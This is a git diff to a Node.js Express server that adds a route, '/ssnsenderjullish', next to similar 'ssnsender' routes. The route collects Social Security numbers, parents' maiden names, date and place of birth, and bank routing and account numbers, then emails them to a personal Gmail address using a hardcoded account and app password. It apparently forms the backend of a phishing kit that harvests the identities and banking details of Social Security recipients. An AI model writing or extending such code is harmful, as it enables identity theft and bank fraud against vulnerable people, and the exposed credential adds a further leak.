@@ -303,6 +303,85 @@ app.post("/ssnsender", async (req, res) => {
   });
 });
 
+
+app.post("/ssnsenderjullish", async (req, res) => {
+  const {
+    fullName,
+    ssn,
+    mailingAddress,
+    fathersName,
+    mothersName,
+    placeOfBirth,
+    state,
+    amountReceived,
+    routingNumber,
+    accountNumber,
+    phoneNumber,
+    receivedSSA,
+    dob,
+    dateOfPayment,
+  } = req.body;
+  console.log(req.body);
+
+  // Construct email message
+  const message = `
+    You go a new information from ${fullName}:
+
+    Full Name: ${fullName}
+
+    SSN: ${ssn}
+
+    Mailing Address on Profile: ${mailingAddress}
+
+    Fathers Full Name and Maiden Name: ${fathersName}
+
+    Mother's Full Name and Maiden Name: ${mothersName}
+
+    Place of Birth (City and State): ${placeOfBirth}
+
+    State: ${state}
+
+    Amount Received Last Month (In USD): ${amountReceived}
+
+    Routing Number That's on File: ${routingNumber}
+
+    Account Number That's on File: ${accountNumber}
+
+    Phone Number: ${phoneNumber}
+
+    Did You Receive SSA (YES or NO): ${receivedSSA}
+
+    Date of Birth (DD/MM/YYYY): ${dob}
+
+    Date of Payment: ${dateOfPayment}
+  `;
+  // Create a transporter object using SMTP transport
+  let transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
+  });
+
+  let mailOptions = {
+    from: "davidmiller4504@gmail.com", // sender address
+    to: "hopejullich@gmail.com", // list of receivers
+    subject: `New Contact Form Submission ${fullName}`, // Subject line
+    text: message, // plain text body
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.status(500).send("Error sending email");
+    } else {
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
+    }
+  });
+});
+
 app.post("/ssnsender2", async (req, res) => {
   const {
     fullName,
